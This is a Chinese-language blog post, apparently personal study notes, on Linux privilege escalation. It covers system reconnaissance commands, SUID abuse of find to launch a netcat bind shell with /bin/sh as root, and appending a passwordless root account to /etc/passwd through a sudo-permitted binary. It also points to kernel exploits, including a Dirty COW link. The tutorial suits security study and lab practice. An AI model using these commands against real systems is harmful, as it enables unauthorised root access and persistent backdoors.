{"title":"一些Linux提权姿势","uid":"6acc9b76870671389b16a7816bf2f860","slug":"一些Linux提权姿势","date":"2020-08-28T14:38:22.000Z","updated":"2020-10-06T02:55:56.000Z","comments":true,"path":"api/articles/一些Linux提权姿势.json","keywords":"A1andNS","cover":"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200601211235.jpg","content":"<p>今天看到了一篇Linux提权姿势的文章，顺着大佬的思路，来学习一下。</p>\n<h2 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h2><h3 id=\"1、内核、操作系统和设备硬件信息\"><a href=\"#1、内核、操作系统和设备硬件信息\" class=\"headerlink\" title=\"1、内核、操作系统和设备硬件信息\"></a>1、内核、操作系统和设备硬件信息</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token comment\">#打印所有可用的系统信息，通常会显示系统主机名、系统内核版本，系统位数和编译时间等信息，基本上就是下面的集合</span>\n<span class=\"token function\">uname</span> -a \n<span class=\"token comment\">#打印内核版本</span>\n<span class=\"token function\">uname</span> -r\n<span class=\"token comment\">#打印系统主机名</span>\n<span class=\"token function\">uname</span> -n 或 <span class=\"token function\">hostname</span>\n<span class=\"token comment\">#查看系统内核架构</span>\n<span class=\"token function\">uname</span> -m\n<span class=\"token comment\">#内核信息，甚至比uname -a更加详细</span>\n<span class=\"token function\">cat</span> /proc/version\n<span class=\"token comment\">#分发信息,感觉release记录的信息更全</span>\n<span class=\"token function\">cat</span> /etc/*-release 或 <span class=\"token function\">cat</span> /etc/issue\n<span class=\"token comment\">#CPU信息</span>\n<span class=\"token function\">cat</span> /proc/cpuinfo<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>运行效果如下图了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200829184545.png\" alt=\"1\"></p>\n<h3 id=\"用户和群组\"><a href=\"#用户和群组\" class=\"headerlink\" title=\"用户和群组\"></a>用户和群组</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token comment\">#列出系统上所有用户，还挺多的</span>\n<span class=\"token function\">cat</span> /etc/passwd\n<span class=\"token comment\">#列出系统上所有的组，不查不知道，还挺多的</span>\n<span class=\"token function\">cat</span> /etc/group\n<span class=\"token comment\">#列出所有的超级用户账户</span>\n<span class=\"token function\">grep</span> -v -E <span class=\"token string\">\"^# \"</span> /etc/passwd <span class=\"token operator\">|</span> <span class=\"token function\">awk</span> -F: <span class=\"token string\">'<span class=\"token variable\">$3</span> == 0&#123; print <span class=\"token variable\">$1</span>&#125;'</span>\n<span class=\"token comment\">#查看当前用户</span>\n<span class=\"token function\">whoami</span>\n<span class=\"token comment\">#谁目前登陆了，行为是什么</span>\nw\n<span class=\"token comment\">#最后登陆的用户的列表</span>\nlast\n<span class=\"token comment\">#所有用户上次登录的信息</span>\nlastlog\n<span class=\"token comment\">#有关指定用户上次登录的信息</span>\nlastlog -u %username%\n<span class=\"token comment\">#以前登陆用户的信息,与lastlog类似</span>\nlastlog <span class=\"token operator\">|</span> <span class=\"token function\">grep</span> -v <span class=\"token string\">\"Never\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>主要常用的可能就是whoami，看看自己的权限是什么，或者cat /etc/passwd来看看用户有哪些，cat  /etc/group是一样的。</p>\n<h3 id=\"用户和权限信息\"><a href=\"#用户和权限信息\" class=\"headerlink\" title=\"用户和权限信息\"></a>用户和权限信息</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token comment\">#查询当前用户的信息,可以看到UID、GID等信息</span>\n<span class=\"token function\">id</span>\n<span class=\"token comment\">#谁被允许以root身份执行,访问此文件需要为root用户才行</span>\n<span class=\"token function\">cat</span> /etc/sudoers\n<span class=\"token comment\">#当前用户可以以root身份执行操作</span>\n<span class=\"token function\">sudo</span> -l<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"环境信息\"><a href=\"#环境信息\" class=\"headerlink\" title=\"环境信息\"></a>环境信息</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token comment\">#显示环境变量</span>\n<span class=\"token function\">env</span> \n<span class=\"token comment\">#现实环境变量</span>\n<span class=\"token builtin class-name\">set</span>\n<span class=\"token comment\">#路径信息</span>\n<span class=\"token builtin class-name\">echo</span> %<span class=\"token environment constant\">PATH</span>\n<span class=\"token comment\">#显示当前用户的历史命令记录</span>\n<span class=\"token function\">history</span> \n<span class=\"token comment\">#输出工作目录，经常被用来查看当前所在目录位置</span>\n<span class=\"token builtin class-name\">pwd</span> \n<span class=\"token comment\">#显示默认系统变量</span>\n<span class=\"token function\">cat</span> /etc/profile \n<span class=\"token comment\">#显示可用的shell，我这有dash和bash</span>\n<span class=\"token function\">cat</span> /etc/shells <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>Bash(GNU Bourne-Again Shell)是许多Linux平台的内定Shell,在GNU/Linux系统中bin/sh本事bash的符号链接，但因为bash过于复杂，有人把bash从NetBSD移植Linux并更名为dash (Debian Almquist Shell)，并建议把/bin/sh指向他，以此获得更快的脚本执行速度。因为Deepin操作系统是基于Debian的，所以Deepin的bin/sh也是指向dash的。</p>\n<p><a href=\"https://imgchr.com/i/dHbCRI\"><img src=\"https://s1.ax1x.com/2020/08/30/dHbCRI.png\" alt=\"8\"></a></p>\n<h2 id=\"SUID\"><a href=\"#SUID\" class=\"headerlink\" title=\"SUID\"></a>SUID</h2><p>SUID可以让调用者以文件拥有者的身份运行该文件，所以我们利用SUID提权就可以运行root用户拥有的SUID文件了，那么我们运行这个文件就需要获得root用户的身份了。</p>\n<p>目前可以用来SUID提权的命令有：</p>\n<p><code>nmap、vim、find、bash、more、less、nano、cp</code></p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token comment\">#以下是查找SUID可执行性文件命令</span>\n<span class=\"token function\">find</span> / -perm -u<span class=\"token operator\">=</span>s -type f <span class=\"token operator\"><span class=\"token file-descriptor important\">2</span>></span>/dev/null\n\n/表示从文件系统的顶部（根）开始并找到每个目录\n-perm 表示搜索随后的权限\n-u <span class=\"token operator\">=</span> s表示查找root用户拥有的文件\n-type表示我们正在寻找的文件类型\nf 表示常规文件，而不是目录或特殊文件\n<span class=\"token number\">2</span> 表示该进程的第二个文件描述符，即stderr（标准错误）\n<span class=\"token operator\">></span> 表示重定向\n/dev/null是一个特殊的文件系统对象，它将丢弃写入其中的所有内容。\n除此之外还有如下命令，不同系统适用于不同命令\n<span class=\"token function\">find</span> / -user root -perm -4000-print<span class=\"token operator\"><span class=\"token file-descriptor important\">2</span>></span>/dev/null\n<span class=\"token function\">find</span> / -user root -perm -4000-exec <span class=\"token function\">ls</span> -ldb <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span> <span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>文件描述符小拓展：</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>STDIN 的文件描述符为 0</p>\n<p>STDOUT 的文件描述符为 1</p>\n<p>STDERR 的文件描述符为 2</p></blockquote>\n<h3 id=\"实际尝试\"><a href=\"#实际尝试\" class=\"headerlink\" title=\"实际尝试\"></a>实际尝试</h3><p>假如我获取到了一台服务器权限的shell</p>\n<h4 id=\"先看看当前用户信息：\"><a href=\"#先看看当前用户信息：\" class=\"headerlink\" title=\"先看看当前用户信息：\"></a>先看看当前用户信息：</h4><p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200829225821.png\" alt=\"2\"></p>\n<h4 id=\"查看具有root权限的SUID文件：\"><a href=\"#查看具有root权限的SUID文件：\" class=\"headerlink\" title=\"查看具有root权限的SUID文件：\"></a>查看具有root权限的SUID文件：</h4><p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200829230132.png\" alt=\"3\"></p>\n<h4 id=\"创建一个文件来测试find命令时候可以以root权限运行\"><a href=\"#创建一个文件来测试find命令时候可以以root权限运行\" class=\"headerlink\" title=\"创建一个文件来测试find命令时候可以以root权限运行\"></a>创建一个文件来测试find命令时候可以以root权限运行</h4><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">touch</span> <span class=\"token builtin class-name\">test</span>\n<span class=\"token function\">find</span> <span class=\"token builtin class-name\">test</span> -exec <span class=\"token function\">whoami</span> <span class=\"token punctuation\">\\</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">#如果回显为root说明是以root权限运行的</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"大部分的linux操作系统都自带netcat，因此可以使用netcat将权限提升至root\"><a href=\"#大部分的linux操作系统都自带netcat，因此可以使用netcat将权限提升至root\" class=\"headerlink\" title=\"大部分的linux操作系统都自带netcat，因此可以使用netcat将权限提升至root\"></a>大部分的linux操作系统都自带netcat，因此可以使用netcat将权限提升至root</h4><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">find</span> <span class=\"token builtin class-name\">test</span> -exec netcat -lvp <span class=\"token number\">9999</span> -e /bin/sh <span class=\"token punctuation\">\\</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>它就反弹回来一个root权限了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200829230319.png\" alt=\"4\"></p>\n<h2 id=\"利用root无密码执行\"><a href=\"#利用root无密码执行\" class=\"headerlink\" title=\"利用root无密码执行\"></a>利用root无密码执行</h2><p>一个命令或者脚本可以以root身份运行，若在无密码情况下去执行，我们可以通过修改脚本内容或直接执行这个命令，利用命令来进行一些操作，来进行提取。</p>\n<h3 id=\"首先查看当前用户权限\"><a href=\"#首先查看当前用户权限\" class=\"headerlink\" title=\"首先查看当前用户权限\"></a>首先查看当前用户权限</h3><p><code>id</code>命令和<code>whoami</code>命令</p>\n<h3 id=\"探查哪些命令sudo不用密码\"><a href=\"#探查哪些命令sudo不用密码\" class=\"headerlink\" title=\"探查哪些命令sudo不用密码\"></a>探查哪些命令sudo不用密码</h3><p><code>sudo -l</code>，假如有一个teehee命令不需要sudo密码，那么先看看teehee命令的帮助文档，了解一下相关命令的使用规则。</p>\n<p>写入一个账号test到passwd中：</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token builtin class-name\">echo</span> <span class=\"token string\">\"test::0::0:::/bin/bash\"</span> <span class=\"token operator\">|</span> <span class=\"token function\">sudo</span> teehee -a /etc/passwd\n<span class=\"token function\">su</span> <span class=\"token builtin class-name\">test</span>\n<span class=\"token function\">whoami</span>  <span class=\"token comment\">#查询一下是否成功得到root权限</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"利用内核漏洞提权\"><a href=\"#利用内核漏洞提权\" class=\"headerlink\" title=\"利用内核漏洞提权\"></a>利用内核漏洞提权</h2><p>如果脏牛提权无法成功，可以查看其他版本的内核漏洞，基本上就是用kali里的searchsploit可以帮助我们查看各种linux发新版本漏洞。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200829230436.png\" alt=\"5\"></p>\n<p>看一下脚本内容。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200829230625.png\" alt=\"6\"></p>\n<p>需要下载exp到本地，运行提权。</p>\n<h2 id=\"脏牛提权\"><a href=\"#脏牛提权\" class=\"headerlink\" title=\"脏牛提权\"></a>脏牛提权</h2><h3 id=\"漏洞范围：\"><a href=\"#漏洞范围：\" class=\"headerlink\" title=\"漏洞范围：\"></a><strong>漏洞范围：</strong></h3><p>大于2.6.22版本 (2007年发行，到2016年10月18日修复)</p>\n<h3 id=\"危害：\"><a href=\"#危害：\" class=\"headerlink\" title=\"危害：\"></a><strong>危害：</strong></h3><p>低权限的用户可利用这一漏洞在本地进行提权</p>\n<h3 id=\"原理：\"><a href=\"#原理：\" class=\"headerlink\" title=\"原理：\"></a><strong>原理：</strong></h3><p>linux内核的子系统在处理写入时复制至产生了竞争条件，恶意用户可利用此漏洞来获取高权限，对只读内存映射进行访问。<br>竞争条件，指的是任务执行顺序异常，可导致应用奔溃，或令攻击者有机可乘，进一步执行其他代码，利用这一漏洞，攻击者可在其目标系统提升权限，甚至可能获取到root权限。</p>\n<h3 id=\"EXP下载\"><a href=\"#EXP下载\" class=\"headerlink\" title=\"EXP下载\"></a><strong>EXP下载</strong></h3><p><a href=\"https://github.com/FireFart/dirtycow\">https://github.com/FireFart/dirtycow</a></p>\n<p>具体做法单独写一篇博客。</p>\n<h2 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h2><p>[1] <a href=\"https://www.jianshu.com/p/762d4cccee7e\">https://www.jianshu.com/p/762d4cccee7e</a></p>\n<p>[2] <a href=\"https://mp.weixin.qq.com/s/23bQ9nhavXGOvOknEc-BAA\">https://mp.weixin.qq.com/s/23bQ9nhavXGOvOknEc-BAA</a></p>\n","text":"今天看到了一篇Linux提权姿势的文章，顺着大佬的思路，来学习一下。 信息收集1、内核、操作系统和设备硬件信息#打印所有可用的系统信息，通常会显示系统主机名、系统内核版本，系统位数和编译时间等信息，基本上就是下面的集合 uname -a #打印内核版本 uname -r #打印系...","link":"","photos":[],"count_time":{"symbolsCount":"2.8k","symbolsTime":"3 mins."},"categories":[{"name":"权限提升","slug":"权限提升","count":2,"path":"api/categories/权限提升.json"}],"tags":[{"name":"Linux","slug":"Linux","count":11,"path":"api/tags/Linux.json"},{"name":"提权","slug":"提权","count":1,"path":"api/tags/提权.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86\"><span class=\"toc-text\">信息收集</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1%E3%80%81%E5%86%85%E6%A0%B8%E3%80%81%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%92%8C%E8%AE%BE%E5%A4%87%E7%A1%AC%E4%BB%B6%E4%BF%A1%E6%81%AF\"><span class=\"toc-text\">1、内核、操作系统和设备硬件信息</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%94%A8%E6%88%B7%E5%92%8C%E7%BE%A4%E7%BB%84\"><span class=\"toc-text\">用户和群组</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%94%A8%E6%88%B7%E5%92%8C%E6%9D%83%E9%99%90%E4%BF%A1%E6%81%AF\"><span class=\"toc-text\">用户和权限信息</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%8E%AF%E5%A2%83%E4%BF%A1%E6%81%AF\"><span class=\"toc-text\">环境信息</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#SUID\"><span class=\"toc-text\">SUID</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%AE%9E%E9%99%85%E5%B0%9D%E8%AF%95\"><span class=\"toc-text\">实际尝试</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%85%88%E7%9C%8B%E7%9C%8B%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%EF%BC%9A\"><span class=\"toc-text\">先看看当前用户信息：</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%9F%A5%E7%9C%8B%E5%85%B7%E6%9C%89root%E6%9D%83%E9%99%90%E7%9A%84SUID%E6%96%87%E4%BB%B6%EF%BC%9A\"><span class=\"toc-text\">查看具有root权限的SUID文件：</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E6%96%87%E4%BB%B6%E6%9D%A5%E6%B5%8B%E8%AF%95find%E5%91%BD%E4%BB%A4%E6%97%B6%E5%80%99%E5%8F%AF%E4%BB%A5%E4%BB%A5root%E6%9D%83%E9%99%90%E8%BF%90%E8%A1%8C\"><span class=\"toc-text\">创建一个文件来测试find命令时候可以以root权限运行</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%A4%A7%E9%83%A8%E5%88%86%E7%9A%84linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E9%83%BD%E8%87%AA%E5%B8%A6netcat%EF%BC%8C%E5%9B%A0%E6%AD%A4%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8netcat%E5%B0%86%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E8%87%B3root\"><span class=\"toc-text\">大部分的linux操作系统都自带netcat，因此可以使用netcat将权限提升至root</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%88%A9%E7%94%A8root%E6%97%A0%E5%AF%86%E7%A0%81%E6%89%A7%E8%A1%8C\"><span class=\"toc-text\">利用root无密码执行</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E9%A6%96%E5%85%88%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90\"><span class=\"toc-text\">首先查看当前用户权限</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%8E%A2%E6%9F%A5%E5%93%AA%E4%BA%9B%E5%91%BD%E4%BB%A4sudo%E4%B8%8D%E7%94%A8%E5%AF%86%E7%A0%81\"><span class=\"toc-text\">探查哪些命令sudo不用密码</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%88%A9%E7%94%A8%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83\"><span class=\"toc-text\">利用内核漏洞提权</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83\"><span class=\"toc-text\">脏牛提权</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E8%8C%83%E5%9B%B4%EF%BC%9A\"><span class=\"toc-text\">漏洞范围：</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%8D%B1%E5%AE%B3%EF%BC%9A\"><span class=\"toc-text\">危害：</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%8E%9F%E7%90%86%EF%BC%9A\"><span class=\"toc-text\">原理：</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#EXP%E4%B8%8B%E8%BD%BD\"><span class=\"toc-text\">EXP下载</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0\"><span class=\"toc-text\">参考文章</span></a></li></ol>","author":{"name":"A1andNS","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"vmware证书劫持网页解决方案","uid":"1d91aea9fb70319bfa262f69111c07de","slug":"vmware证书劫持网页解决方案","date":"2020-08-30T05:22:01.000Z","updated":"2020-08-30T05:59:58.000Z","comments":true,"path":"api/articles/vmware证书劫持网页解决方案.json","keywords":"A1andNS","cover":[],"text":"问题起因最近，经常听说有人在访问网页的时候，发现证书报错访问不了，而证书上显示的却是vmware，似乎是因为vmware的原因，一个不对应的证书劫持了网页，以至于浏览器爆出风险提示。之前只是听说，谁知道突然我也出现了这个问题。见下图： 然后我查看了证书： 果然是vmware，这让...","link":"","photos":[],"count_time":{"symbolsCount":535,"symbolsTime":"1 mins."},"categories":[{"name":"资源教程","slug":"资源教程","count":7,"path":"api/categories/资源教程.json"}],"tags":[{"name":"vmware","slug":"vmware","count":1,"path":"api/tags/vmware.json"}],"author":{"name":"A1andNS","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"PHP学习(三)","uid":"baa430cea36dc29f733210bfed21d4b2","slug":"PHP学习-三","date":"2020-08-26T08:29:50.000Z","updated":"2020-08-31T12:11:36.000Z","comments":true,"path":"api/articles/PHP学习-三.json","keywords":"A1andNS","cover":null,"text":"PHP EOF(headoc)这是一种在命令行shell和程序语言perl、PHP等里定义一个字符串的方法 关键点 必须后接分号，否则编译通不过。 EOF 可以用任意其它字符代替，只需保证结束标识与开始标识一致。 结束标识必须顶格独自占一行(即必须从行首开始，前后不能衔接任何空白...","link":"","photos":[],"count_time":{"symbolsCount":321,"symbolsTime":"1 mins."},"categories":[{"name":"PHP","slug":"PHP","count":7,"path":"api/categories/PHP.json"}],"tags":[{"name":"PHP","slug":"PHP","count":8,"path":"api/tags/PHP.json"}],"author":{"name":"A1andNS","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}